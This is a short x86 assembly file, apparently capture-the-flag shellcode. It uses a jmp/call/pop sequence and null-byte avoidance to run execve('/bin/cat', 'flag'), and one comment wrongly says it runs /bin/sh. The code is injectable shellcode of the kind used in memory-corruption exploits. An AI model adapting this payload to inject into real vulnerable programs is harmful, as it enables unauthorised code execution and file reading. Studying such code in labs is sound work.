#include <sys/syscall.h>

#define STRING  "/bin/catNflag"
#define STRLEN1  8
#define STRLEN2 13
#define ARGV0   (STRLEN2+1)
#define ARGV1	(ARGV0+4)
#define ENVP    (ARGV0+8)

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  popl    %esi                    /* esi points to STRING */
  movl    %esi,(ARGV0)(%esi)       /* set up argv[0] pointer to pathname */
  leal    (0x9)(%esi),%eax
  movl    %eax,(ARGV1)(%esi)
  xorl    %eax,%eax               /* get a 32-bit zero value */
  movb    %al,(STRLEN1)(%esi)      /* null-terminate end of cat */
  movb    %al,(STRLEN2)(%esi)	  /* null-terminate end of flag */
  movl    %eax,(ENVP)(%esi)       /* set up null envp */
  
  movb    $SYS_execve,%al         /* syscall number */
  movl    %esi,%ebx               /* arg 1: string pathname */
  leal    ARGV0(%esi),%ecx         /* arg 2: argv */
  leal    ENVP(%esi),%edx         /* arg 3: envp */
  int     $0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */
  
  xorl    %ebx,%ebx               /* arg 1: 0 */
  movl    %ebx,%eax
  inc     %eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int     $0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING
